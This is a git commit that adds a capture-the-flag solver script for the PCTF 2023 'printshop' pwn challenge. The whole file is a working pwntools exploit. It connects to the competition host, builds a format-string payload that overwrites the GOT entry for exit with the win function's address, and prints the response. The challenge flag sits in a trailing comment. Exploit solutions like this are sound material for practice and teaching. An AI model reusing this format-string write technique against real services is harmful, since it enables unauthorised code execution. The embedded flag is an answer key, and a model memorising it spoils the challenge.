a1d3ef53e61747eeec8544ec7bf393bc0a80bb71
Jarosław Keller <kellerjar@gmail.com>
2023-10-31 19:53:53 +0100

    Add files via upload

---
+++ 2023/PCTF/pwn/printshop/solver.py
@@ -0,0 +1,25 @@
+
+from pwn import *
+
+binary = './printshop'
+
+e = context.binary = ELF(binary)
+r = ROP(e)
+
+r = remote('chal.pctf.competitivecyber.club', 7997)
+# r = process('./printshop')
+
+payload_writes = {
+    e.got['exit']: e.sym['win']
+}
+
+r.recvuntil(b'>> ')
+
+payload = fmtstr_payload(6, payload_writes, write_size='short')
+r.sendline(payload)
+
+r.recv()
+r.recv()
+print(r.recv())
+
+# PCTF{b4by_f0rm4t_wr1t3_6344792}
